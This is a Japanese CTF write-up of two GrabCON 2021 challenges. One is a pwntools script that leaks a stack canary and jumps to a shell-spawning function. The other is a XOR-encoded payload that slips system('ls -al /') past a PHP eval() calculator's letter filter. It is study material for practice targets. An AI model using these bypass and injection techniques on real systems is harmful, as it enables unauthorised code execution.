---
title: "GrabCON CTF 2021 Writeup"
date: 2021-09-05T20:00:00+09:00
lastmod: 2021-09-05T20:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fgrabcon_ctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://ctf.thecybergrabs.org/](https://ctf.thecybergrabs.org/)
<br /><br />
結構、Server Errorが出てましたね。。

<br />

750点を獲得し、174位でした。

<br><br>

<img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_Score1.png" alt="grabcon_CTF_2021_Score1.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_Score2.png" alt="grabcon_CTF_2021_Score2.png">


<br><br>
チャレンジのリストです。

<img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_chall1.png" alt="grabcon_CTF_2021_chall1.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_chall2.png" alt="grabcon_CTF_2021_chall2.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_chall3.png" alt="grabcon_CTF_2021_chall3.png">

<br>



<br /><br />
## [Pwn]: Can you? (100 points)
- - -
### Challenge
> Can you?
<br /><br />
nc 35.246.42.94 31337

Attachment:

- cancancan (ELF 32bit)

<br />

### Solution
checksecを確認。
<pre>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</pre>

タイトルなどから、Canaryに関連したチャレンジなのがわかります。

<br />
Ghidraでコードを確認します。

{{< highlight powershell "linenos=table,hl_lines=27 28" >}}
undefined4 main(void)

{
  init((EVP_PKEY_CTX *)&stack0x00000004);
  puts("can you bypass me???");
  vuln();
  return 0;
}


void vuln(void)

{
  int in_GS_OFFSET;
  char *__buf;
  undefined4 uVar1;
  undefined4 uVar2;
  int local_78;
  char local_74 [100];
  int local_10;
  
  uVar2 = 0x80492d6;
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  for (local_78 = 0; local_78 < 2; local_78 = local_78 + 1) {
    uVar1 = 0x200;
    __buf = local_74;
    read(0,__buf,0x200);
    printf(local_74,__buf,uVar1,uVar2);
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}


void win(void)

{
  system("/bin/sh");
  return;
}

{{< / highlight >}}

<br />
Buffer Overflow と、Format String Bug (書式文字列攻撃) の両方の脆弱性がありますね。

<br />
"ctf 32bit canary fsb leak" でググったら、以下のWikiでほぼそのまんまの内容が見つかりました。

[https://wiki.vaala.cloud/pwn/linux/mitigation/canary/#canary-leaks-canary](https://wiki.vaala.cloud/pwn/linux/mitigation/canary/#canary-leaks-canary)

<br />

書いたコード（ほぼ流用）

```Python
#!/usr/bin/env python
from pwn import *
context.binary = 'cancancan'

s = remote('35.246.42.94', 31337)

# Leak Canary
s.recvuntil("can you bypass me???")
payload = "A" * 100
s.sendline(payload)
s.recvuntil ("A" * 100)
Canary = u32(s.recv(4))-0xa
log.info("Canary:"+hex(Canary))

# Bypass Canary
addr_win = ELF("./cancancan").sym["win"]
payload = b"A" * 100 + p32(Canary) + b"A" * 12 + p32(addr_win)
s.send(payload)
s.interactive ()

```

<br />
Wikiではあんまり説明がなかったので補足すると、pwntoolsのsendlineは最後に改行 ("\n") が入るので101バイトが書き込まれ、("\n") で Canary の "\x00" 部分が上書きされます。

これによって、printfの結果がもともと"\x00"で止まるはずだったのが、Canaryを含めて出力されます。

("\n")は "\x0a" なので、-0xa をしています。0xFFFFFF00 でゼロクリアでも同じ結果になるはず。


<br />

Flag: `GrabCON{Byp4ss_can4ry_1s_fun!}`



<br /><br />
<br /><br />
## [Web]: Basic Calc (150 points)
- - -
### Challenge
> Ever used calc based on php?
<br /><br />
Link

<br />

### Solution
ウェブサイトにアクセスすると、計算用のフォームと、PHPコードが表示されます。

PHPのコード部分は以下でした。
```php
<?php

if (isset($_POST["eq"])){
    
    $eq = $_POST["eq"];

    if(preg_match("/[A-Za-z`]+/",$eq)){
        die("BAD.");
    }
    echo "Result: ";
    eval("echo " . $eq . " ;");
}else{
  echo highlight_file('index.php',true);  
}

?>
```
<br />
アルファベットを使わずにコマンドを入力しeval()に渡す、ということをしないといけません。

<br />
これも、ググって調べると、どうやら Root-Me の「PHP Eval」という問題と同じみたいです。

以下の Write Up を参考にさせていただきました。<br>
[https://joshuanatan.medium.com/root-me-web-server-php-eval-f77584cae128](https://joshuanatan.medium.com/root-me-web-server-php-eval-f77584cae128)

<br />
コードは上記の Write Up をそのまま使ったので、ここには載せません。

<br />

system("ls -al")を実行したいとすると、
<pre>
system = ('('^'[').('$'^']').('('^'[').(')'^']').('%'^'@').('-'^'@')
ls -al / = (','^'@').('('^'[').('['^'{').'-'.('!'^'@').(','^'@').('['^'{').'/'
</pre>

<br />

以下をPOSTすることになります。
<pre>
<font color="red">(</font>('('^'[').('$'^']').('('^'[').(')'^']').('%'^'@').('-'^'@')<font color="red">)</font><font color="red">(</font>(','^'@').('('^'[').('['^'{').'-'.('!'^'@').(','^'@').('['^'{').'/'<font color="red">)</font>
</pre>
このようにカッコ（<font color="red">赤い</font>部分）をつけないと、単純にechoでコマンド自体が表示されて、コマンドの結果が得られません。

<br />

`ls -al /` を確認したら、/flagggg.txt があるのがわかります。

ここで、

`cat /flagggg.txt` をやろうとすると、以下のようにエラーになってしまいました。

<img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_basic_calc.png" alt="grabcon_CTF_2021_basic_calc.png">

<br />

`cat /*.txt` にて、フラグを得ることができました。

<br />

Flag: `GrabCON{b4by_php_f0r_y0u}`


<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />
